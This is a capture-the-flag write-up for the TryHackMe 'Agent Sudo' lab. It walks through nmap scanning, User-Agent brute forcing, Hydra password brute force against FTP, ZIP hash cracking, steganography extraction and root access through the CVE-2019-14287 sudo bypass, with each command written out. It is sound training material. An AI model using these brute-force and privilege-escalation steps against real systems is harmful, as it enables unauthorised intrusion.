---
title: "Agent Sudo"
date: 13.02.2025
categories: [CaptureTheFlag, TryHackMe]
tags: [CTF, CrackingHashes, Cryptography, Forensics]
---

## Enumeration
> Enumerate the machine and get all the important information

### Reconnaissance with NMAP
We start by adding the target machine to `/etc/hosts` and enumerating the machine using NMAP
```shell
nmap -sV -sC -oA nmap/agentsudo -vv agent.thm
```

#### NMAP Result
Looking at the NMAP results we can see that there are three open ports including
- FTP on port 21
- SSH on port 22
- HTTP on port 80

```shell
Nmap scan report for agent.thm (10.10.105.129)
Host is up, received echo-reply ttl 63 (0.048s latency).
Scanned at 2025-02-12 19:33:18 CET for 11s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### Investigating the Website
When visiting `http://agent.thm` we can see the following message  

![Website](assets/img/AgentSudo_WebPage.png)

hinting we have to change the *user-agent* to get any further. 
We can use Burp Suite to intercept the `GET` request after reloading the page. 
We use the *Repeater-Tab* to modify the `user-agent` to *R* as this has 
to be one of the codenames the message was talking about.

![User Agent](assets/img/AgentSudo_UserAgent.png)

When using *R* as the user agent we see that the content of the web-page changed and there is some additional information we can use for our further investigation.

![AgentR](assets/img/AgentSudo_UserAgentR.png)

We now know that there are 25 other employees and as one codename is *R* we can assume all the codenames range from *A* to *Z*.
Using Burp Suite we can use the *Intruder-Tab* to prepare a brute-force attack on the user-agent

![Intruder Attack](assets/img/AgentSudo_BruteForceCodename.png)

After executing the attack we can see a redirect to another page when using the codename *C* as the *user-agent*

![Succes on Agent C](assets/img/AgentSudo_AgentC.png)

When visiting `http://agent.thm/agent_C_attention.php` we receive this message:

![Attention Chris](assets/img/AgentSudo_AttentionChris.png)

which gives us `chris` as a username

## Hash Cracking and Brute-Force
We start off by trying to brute-force into `ftp` using *Hydra*.
As we know from the message chris' password is weak so `rockyou.txt` might do the trick
```shell
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agent.thm
```
This gives us the ftp password for `chris` which we then can use to establish a ftp session
```shell
ftp agent.thm
```
after establishing the connection we can see three files in the directory which we download using the `get` command.
We start by looking at the `.txt` file first 

![To Agent J](assets/img/AgentSudo_ToAgentJ.png)

and get the hint that there is another image hidden in one of the downloaded images.
knowing this we can use `binwalk` to check the files
```shell
binwalk -e cutie.png cute_alien.jpg
```
Using `-e` will also extract the file if it is a known file type
We are able to extract a directory including a ZIP file called `8702.zip`. As this file is password-protected we will use *John the Ripper* to crack the password.
First we have to put the ZIP file in a readable format for *John* using 
```shell
zip2john 8702.zip > ZipForJohn
```
before using John
```shell
john --wordlist=/usr/share/wordlist/rockyou.txt ZipForJohn
```
After cracking the password we can extract the content of the ZIP file
```ssh
7z x 8702.zip
```
which is another text file that reads

![To Agent J](assets/img/AgentSudo_ToAgentR.png)

We can use CyberChef to decode the secret message within the text file.
I tried decoding the message using *ROT13* first, but as this had no result I tried Base64, which gave me the password to extract the stegfile hidden in `cute-alien.jpg`
```shell
steghide --extract -sf cute-alien.jpg
```
This gave us another message that includes a username `james` and his password we can then use to connect via ssh.

![User James](assets/img/AgentSudo_James.png)

## Privilege Escalation
Checking `sudo -l` to show permissions for `james` and a quick Google search leads to **CVE-2019-14287**
We can can bypass sudo authentication using
```shell
sudo -u#-1 /bin/bash
```
and get `root` access.
